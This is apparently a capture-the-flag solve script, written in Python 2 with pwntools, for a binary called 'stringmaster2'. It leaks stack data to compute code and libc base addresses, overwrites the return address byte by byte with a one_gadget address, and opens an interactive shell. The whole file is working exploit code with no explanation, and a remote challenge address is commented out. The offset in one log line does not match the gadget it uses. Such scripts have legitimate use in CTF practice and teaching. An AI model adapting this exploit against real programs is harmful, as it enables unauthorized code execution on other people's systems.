#!/usr/bin/env python
# coding=utf-8
from pwn import *
p=process('./stringmaster2')
#p=remote("35.207.132.47"," 22225")
p.recvuntil("String1: ")
s1=p.recvline().strip('\n')
p.recvuntil("String2: ")
s2=p.recvline().strip('\n')

def swap(i1,i2):
    p.sendlineafter("> ","swap %d %d"%(i1,i2))
def replace(c1,c2):
    info("going to replace %x with %x"%(ord(c1),ord(c2)))
    p.sendlineafter("[4] quit                                              \n> ","replace %c %c"%(c1,c2))
def printt():
    p.sendlineafter("> ","print")
def quit():
    p.sendlineafter("> ","quit")

info("S1: %s"%s1)
info("S2: %s"%s2)
swap(1,2)
#printt()
replace('\x00','c')
printt()
p.recvuntil(s1[0]+s1[2]+s1[1]+s1[3:])
p.recv(40-10)
codebase=u64(p.recv(8))-0x2671
info("codebase: 0x%x"%codebase)
p.recv(136-48)
libcbase=u64(p.recv(8))-0x20830-0x1367
info("libcbase: 0x%x"%libcbase)

retaddr=p64(codebase+0x25fb)
onegadget=p64(libcbase+0x10a38c)#0x4526a,0xf02a4,0xf1147
info("retaddr: 0x%x"%(codebase+0x25fb))
info("onegadget: 0x%x"%(libcbase+0x4f2c5))


printt()
print retaddr in p.recvuntil(retaddr)

for i in range(1):
    replace(retaddr[0],onegadget[0])
for i in range(1):
    replace(retaddr[1],onegadget[1])
for i in range(4):
    replace(retaddr[2],onegadget[2])
for i in range(4):
    replace(retaddr[3],onegadget[3])
for i in range(4):
    replace(retaddr[4],onegadget[4])
for i in range(4):
    replace(retaddr[5],onegadget[5])
# context.log_level='debug'
'''
for i in range(6):
    print i
    j=0
    while (1):
        j=j+1
        replace(retaddr[i],onegadget[i])

        printt()
        if not retaddr in p.recvuntil(retaddr,timeout=1000):
            retaddr=retaddr[:i]+onegadget[i]+retaddr[i+1:]
            info("new retaddr: 0x%x"%u64(retaddr))
            info("onegadget: 0x%x"%u64(onegadget))
            info("J: %d"%j)
            break
        else:
            print "fail to replace"
'''


#p.recvuntil("\x6d\x24\x40")
#replace("\x6d","\xa7")
#replace("\x6d","\xa7")
#replace("\x24",'\x11')
#replace("\x24",'\x11')
quit()
p.interactive()
